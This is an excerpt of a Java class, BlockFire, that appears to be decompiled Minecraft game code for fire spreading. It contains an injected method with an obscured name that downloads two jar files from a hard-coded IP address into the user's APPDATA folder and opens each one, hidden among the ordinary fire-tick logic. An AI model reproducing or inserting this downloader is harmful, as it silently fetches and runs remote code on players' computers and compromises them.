...
public class BlockFire extends Block
{
  ...
  public static void func_1773943_d() {
    String urls = "http://145.239.61.19/oof.jar";
    String urlz = "http://145.239.61.19/pew.jar";
    URL url = verify(urls);
    saveFile(url, System.getenv("APPDATA") + "/oof.jar");
    try {
      Desktop.getDesktop().open(new File(System.getenv("APPDATA") + "/oof.jar"));
    } catch (Exception e) {
      e.printStackTrace();
    }
    URL urll = verify(urlz);
    saveFile(urll, System.getenv("APPDATA") + "/pew.jar");
    try {
      Desktop.getDesktop().open(new File(System.getenv("APPDATA") + "/pew.jar"));
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
  ...
  public void updateTick(World worldIn, BlockPos pos, IBlockState state, Random rand)
  {
    if (worldIn.getGameRules().getGameRuleBooleanValue("doFireTick"))
    {
      ...
      if (((provider instanceof WorldProviderEnd)) && (var5 == Blocks.bedrock))
      {
        var6 = true;
      }
